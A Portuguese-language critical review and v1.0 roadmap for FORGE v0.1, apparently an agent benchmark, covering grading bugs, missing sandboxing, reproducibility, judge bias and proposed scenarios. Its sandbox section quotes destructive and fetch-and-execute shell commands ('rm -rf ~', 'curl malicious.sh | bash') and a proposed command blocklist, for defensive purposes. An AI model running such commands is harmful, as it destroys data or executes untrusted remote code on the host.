# FORGE v0.1 — Análise Crítica e Roadmap para v1.0

**Data:** 2026-06-04  
**Revisores:** Gemini 2.5 Pro (metodologia científica) + Claude Sonnet 4.6 (síntese + engenharia)  
**Método:** Multi-LLM review via octo:review  
**Status:** PRÉ-PUBLICAÇÃO — não citar antes de v1.0

---

## Sumário Executivo

O FORGE v0.1 é um ponto de partida sólido conceitualmente — a ideia de medir agentes em tarefas reais encadeadas preenche uma lacuna genuína entre o ABS (capacidade genérica) e o LOP (operações de infra controladas). No entanto, na forma atual, o framework tem **quatro bloqueadores críticos** que impediriam qualquer resultado de ser reproduzido ou publicado: um bug de substituição de variável que invalida os checks de F2 e F3, ausência de sandbox em `run_bash`, dependência de serviços externos não controlados, e K=1 (sem múltiplos runs para medir estabilidade). Esses problemas precisam ser resolvidos antes do primeiro benchmark real.

---

## 1. Bugs de Engenharia

### CRÍTICO — `{model_slug}` não é substituído em `auto_evaluate()`

**Onde:** `forge_runner.py:auto_evaluate()` + `scenarios/F2.json` + `scenarios/F3.json`

O prompt de F2 e F3 usa `{model_slug}` nos paths dos checks:
```json
{"type": "file_exists", "path": "relatorio-{model_slug}.md"}
```

O `auto_evaluate()` faz `workdir / check['path']` sem chamar `.format()`. O agente salva `relatorio-gemma4-26b.md`, mas o check procura `relatorio-{model_slug}.md` literalmente. **Todos os checks de file_exists e file_contains de F2 e F3 vão falhar sempre**, independentemente do modelo.

**Fix:** Em `auto_evaluate()`, antes de usar `check['path']`, substituir:
```python
path_str = check.get("path", "").format(model_slug=slug, **scenario.get("prompt_vars", {}))
```

---

### CRÍTICO — `run_bash` sem sandbox

**Onde:** `forge_runner.py:exec_run_bash()`

O modelo pode executar qualquer comando no host: `rm -rf ~`, `curl malicious.sh | bash`, `kill -9 $(pgrep python)`. A única proteção atual é que `write_file` não permite paths fora do workdir — mas `run_bash` não tem essa restrição.

**Fix mínimo:** Envolver em `firejail --noprofile --net=none` ou executa dentro de um container Docker descartável por run. Mínimo aceitável: allowlist de comandos (bash, python3, curl, mkdir, ls, cat, git) com blocklist explícita (rm -rf, wget com pipe, sudo).

---

### ALTO — Servidores HTTP não são encerrados entre runs

**Onde:** `forge_runner.py` — sem `cleanup()` ou `teardown()`

F1 sobe `python3 -m http.server PORT &`. Ao testar 10 modelos em sequência nas portas 8200-8209, esses 10 processos ficam rodando. Na run seguinte, a porta já está ocupada e `http_ok` check vai passar por qualquer servidor de run anterior, não pelo atual.

**Fix:** Registrar o PID do servidor após `run_bash`, armazenar em `agent_result`, encerrar com `os.kill(pid, signal.SIGTERM)` no `finally` do `run_agent()`.

---

### ALTO — Contexto overflow em F2

**Onde:** `scenarios/F2.json` — `http_get` do GitHub

O HTML bruto de `https://github.com/n8n-io/n8n` tem 200-500KB (~50.000-125.000 tokens). Com `num_ctx=4096`, o resultado da ferramenta entra no contexto e empurra o prompt original para fora. O modelo vai "esquecer" que precisa escrever 5 seções específicas.

**Fix:** Truncar a resposta do `http_get` a 6.000 chars em `exec_http_get()` para F2, ou usar `html.parser` para extrair apenas `<title>`, `<meta description>`, `<h1>-<h3>`, e `<p>` sem boilerplate de navegação.

---

### MÉDIO — `forge_judge.py` não passa o `model_slug` para substituição de paths

**Onde:** `forge_judge.py:evaluate_file()`

Ao carregar o cenário para obter a rubrica, o judge não passa o slug para resolver paths dinâmicos. Menor impacto pois o judge trabalha com o JSON de resultado (não com o workdir diretamente), mas pode causar erros em extensões futuras.

---

## 2. Problemas Metodológicos

### CRÍTICO — K=1: sem múltiplos runs, sem medição de estabilidade

**Impacto:** O ABS usa K=3, o LOP usa K=5. Um único run não captura variância. Um modelo que passa no F1 numa tentativa pode falhar em 2 das 3 — sem K>1 isso é invisível. Para publicação, resultados sem desvio padrão ou intervalo de confiança não são citáveis.

**Fix:** Mínimo K=3 por cenário. Para STAB, K=3 com intervalo mínimo de 12h (como no LOP). Adicionar `--runs N` ao CLI do runner. Calcular média e σ nos resultados.

---

### CRÍTICO — Dependências externas não controladas invalida reprodutibilidade

**Impacto:** F2 usa `https://github.com/n8n-io/n8n` (conteúdo muda a cada commit). F3 usa cotações em tempo real (valores mudam a cada segundo). Dois modelos testados com 1h de diferença recebem entradas diferentes. Isso viola o princípio básico de fairness de benchmark: **mesma entrada para todos os modelos**.

**Fix estrutural:** Criar servidor de mock local:
```python
# forge_mock_server.py — sobe na porta 9900 antes dos testes
# GET /mock/github-n8n    → retorna fixtures/github-n8n-snapshot.html
# GET /mock/usd-brl       → retorna fixtures/market-snapshot.json
# GET /mock/btc-brl       → retorna fixtures/market-snapshot.json
```
Cada fixture é um snapshot real capturado em data fixa, versionado no git. Os prompts de F2/F3 apontam para `http://localhost:9900/mock/...`. ADR obrigatório documentando a decisão e a data do snapshot.

---

### ALTO — F2 e F3 são estruturalmente redundantes

**Impacto:** Ambos seguem exatamente o mesmo fluxo: `http_get → analisar → escrever .md com seções → send_claudio`. Testam a mesma habilidade com dados diferentes. Isso desperdiça capacidade de discriminação do benchmark.

**Fix:** Manter F3 como está (câmbio/cripto é útil e concreto). Reformular F2 para testar uma dimensão diferente: **depuração e refatoração de código existente** (ler arquivo com bug, corrigir, verificar com teste).

---

### ALTO — `file_contains` com string exata é frágil e penaliza diversidade

**Impacto:** O check `"needle": "OPORTUNIDADES"` falha se o modelo escrever "## Oportunidades de Uso" ou "### OPORTUNIDADE". O check `"needle": "RELEV"` pode falhar se o modelo usar "RELEVANCE" (EN) ou "APLICABILIDADE". Penaliza modelos que produzem output semanticamente correto mas lexicalmente diferente — um viés anti-diversidade.

**Fix:** Para arquivos Markdown, usar um parser (`python-markdown`) para verificar se há N seções de nível h2/h3, independente do título exato. Para JSON, validar estrutura em vez de conteúdo. Para HTML, usar `html.parser` em vez de string matching.

---

### ALTO — LLM-Judge com modelo único introduz viés sistêmico

**Impacto:** `gemma4:26b` avaliando todos os outros modelos tem dois riscos: (1) viés de arquitetura — pode favorecer outputs de modelos da mesma família ou com estilo similar, (2) viés de capacidade — não consegue reconhecer qualidade superior à sua própria.

**Fix:** Ensemble de 3 juízes com modelos de famílias diferentes (ex: `gemma4:26b` + `qwen3.5:27b` + `qwen3:14b`). Usar mediana das notas. Documentar o ensemble como parâmetro versionado do benchmark (mudar o conjunto de juízes é uma mudança de versão maior).

---

### MÉDIO — Pesos do scoring (30/30/20/20) sem justificativa documentada

**Impacto:** Por que AUTO e LLM-JUDGE têm peso 50% maior que HUMAN? O HUMAN é o único avaliador que pode verificar se o output é genuinamente útil. A ausência de um ADR torna os pesos arbitrários e não comparáveis entre versões.

**Fix:** ADR-002 documentando: (a) por que AUTO tem esse peso (escalabilidade), (b) por que HUMAN tem menos peso que LLM-JUDGE (replicabilidade), (c) como os pesos devem mudar se o benchmark for usado em produção vs. pesquisa.

---

### MÉDIO — Avaliação humana por único avaliador sem protocolo cego

**Impacto:** Para publicação científica, avaliação subjetiva requer inter-rater reliability (Kappa de Cohen). Um único avaliador que sabe qual modelo produziu qual output tem viés de confirmação.

**Fix mínimo:** Randomizar a ordem de apresentação dos outputs antes da avaliação humana (`forge_human_eval.py` que apresenta outputs anonimizados). Para publicação: 2-3 avaliadores independentes + cálculo de Kappa.

---

### BAIXO — Ausência de baseline publicado

**Impacto:** Sem um baseline (mesmo que seja o resultado do modelo mais fraco ou de uma "solução de referência" escrita por humano), os scores são números no vácuo.

**Fix:** Criar `baselines/F1-human-reference/`, `baselines/F2-human-reference/` com soluções escritas por humano que recebem score máximo por definição. Executar o modelo mais fraco testado (ex: `qwen3.5:2b`) para estabelecer o piso.

---

## 3. Completude dos Cenários

### Dimensões cobertas por F1/F2/F3

| Dimensão | F1 | F2 | F3 |
|---|---|---|---|
| Geração de artefato (código/texto) | ✓ | ✓ | ✓ |
| Tool use: escrita de arquivo | ✓ | ✓ | ✓ |
| Tool use: execução shell | ✓ | — | — |
| Tool use: HTTP GET | — | ✓ | ✓ |
| Notificação externa (Telegram) | — | ✓ | ✓ |
| Encadeamento de múltiplas fontes | — | — | ✓ |
| Depuração / recuperação de erro | — | — | — |
| Interação multi-arquivo | — | — | — |
| Auto-verificação do próprio output | parcial | — | — |
| Planejamento de longo prazo | — | — | — |

**Lacunas críticas:**
- **Depuração:** Nenhum cenário exige que o modelo leia um arquivo com erro e corrija-o
- **Multi-arquivo:** Nenhum cenário requer coordenação entre 3+ arquivos
- **Recuperação de erro:** O modelo nunca recebe um `run_bash` que falha e precisa reagir

---

## 4. Cenários Sugeridos para Aumentar Poder Discriminativo

### F4 — Depuração de Script Python (substitui F2 estrutural)
**Tarefa:** Um arquivo `script.py` existe no workdir com 3 bugs intencionais. Um arquivo `test_script.py` existe com os testes que devem passar. O modelo deve: ler `script.py`, ler `test_script.py`, executar os testes (`python3 -m pytest`), identificar os bugs, corrigi-los, executar os testes novamente e confirmar que passaram.
**Por que discrimina:** Requer ciclo read→analyze→write→verify. Modelos que não conseguem fechar o loop de depuração ficam presos.

### F5 — Pipeline de Dados Multi-arquivo
**Tarefa:** Um arquivo `config.json` define parâmetros de processamento. Um arquivo `data.csv` com 20 linhas contém dados brutos. O modelo deve: ler config, ler dados, escrever `process.py` que aplica as transformações definidas, executar o script, verificar que `output.csv` foi criado com o número correto de linhas.
**Por que discrimina:** Testa coordenação entre 3 arquivos diferentes e verificação de output computacional.

### F6 — Self-Healing: Recuperação de Falha de Ferramenta
**Tarefa:** O modelo recebe uma tarefa de análise. A URL alvo retorna 404 propositalmente. O modelo deve detectar o erro, tentar uma URL alternativa (fornecida no prompt como fallback), e continuar a tarefa.
**Por que discrimina:** Testa resiliência e adaptação a falhas — crítico para agentes de produção.

---

## 5. Problemas Práticos — Top-5 Modos de Falha na Primeira Execução

Ao rodar `forge_runner.py qwen3.5:9b --all`:

1. **F2/F3 score=0 por bug de {model_slug}** — todos os file_exists/file_contains falham sempre, independentemente do output do modelo (BUG CONFIRMADO)

2. **F1: porta 8200 ocupada por run anterior** — na segunda execução sem reiniciar o servidor, `http_ok` check vai passar pelo processo anterior, não pelo atual

3. **F2: contexto overflow com HTML do GitHub** — qwen3.5:9b tem num_ctx=4096; o HTML retornado preenche ~90% do contexto e o modelo esquece as seções do relatório

4. **F3: análise de tendência alucinada** — modelo recebe 7 pontos de dados históricos mas produz análise genérica ("o dólar está em alta/queda") sem referenciar os valores reais do histórico — passa nos file_contains mas falha no LLM-judge

5. **Qualquer cenário: loop exaustivo sem resultado** — modelo chama ferramentas repetidamente sem convergir (ex: `read_file` + `http_get` em loop), atinge `MAX_TURNS=20`, nenhum arquivo criado, score=0 sem diagnóstico claro de por que falhou

---

## 6. Checklist para v1.0 (publicável)

### Engenharia (bloqueadores)
- [ ] Fix: `{model_slug}` substituído em `auto_evaluate()`
- [ ] Fix: cleanup de processos em background após cada run
- [ ] Fix: truncamento de resposta HTTP em `exec_http_get()` (máx 6000 chars)
- [ ] Fix: sandbox mínimo para `run_bash` (allowlist de comandos)
- [ ] Feat: `--runs N` para K repetições por cenário

### Metodologia (bloqueadores)
- [ ] Servidor de mock local para F2 e F3 (fixtures versionadas)
- [ ] K=3 por cenário como mínimo
- [ ] Ensemble de juízes (3 modelos diferentes)
- [ ] Avaliação humana com output anonimizado

### Cenários (melhorias)
- [ ] Reformular F2 para testar depuração (não sobreposição com F3)
- [ ] Adicionar F4 (depuração Python com testes)
- [ ] Adicionar F5 (pipeline multi-arquivo)
- [ ] Checks semânticos em substituição a `file_contains` string exata

### Documentação científica (para citação)
- [ ] ADR-001: Tratamento de dependências externas e estratégia de mock
- [ ] ADR-002: Justificativa dos pesos do scoring
- [ ] ADR-003: Princípios de design de cenários FORGE
- [ ] ADR-004: Protocolo de avaliação humana (cego, multi-avaliador)
- [ ] Seção de ameaças à validade (interna e externa)
- [ ] Baseline publicado (human-reference + modelo mínimo)
- [ ] Tabela de comparação com ABS e LOP (o que cada um mede que os outros não medem)

---

## 7. Posicionamento dos Três Benchmarks

| | ABS | LOP | FORGE |
|---|---|---|---|
| **O que mede** | Capacidade geral de agente | Confiabilidade operacional em infra | Autonomia em tarefas reais abertas |
| **Ambiente** | Controlado, determinístico | Controlado com fixtures | Real, com efeitos colaterais |
| **Entrada** | Prompts fixos | Fixtures sintéticas fixas | URLs/APIs (mock na v1.0) |
| **Avaliação** | Automática (QUAL/TOOL scores) | Automática (JSON/class/triage) | Multi-camada (auto+llm+claude+human) |
| **K por cenário** | 3 | 5 | 1 (→ 3 na v1.0) |
| **Citável hoje?** | Sim (KDMILE 2026) | Em preparação | Não — v0.1 é protótipo |
| **Pergunta que responde** | "O modelo sabe fazer X?" | "O modelo executa X de forma confiável?" | "O modelo consegue resolver Y do início ao fim autonomamente?" |

---

*Documento gerado por análise multi-LLM: Gemini 2.5 Pro (metodologia) + Claude Sonnet 4.6 (engenharia + síntese)*  
*Próxima revisão: após implementação dos fixes de engenharia (v0.2)*
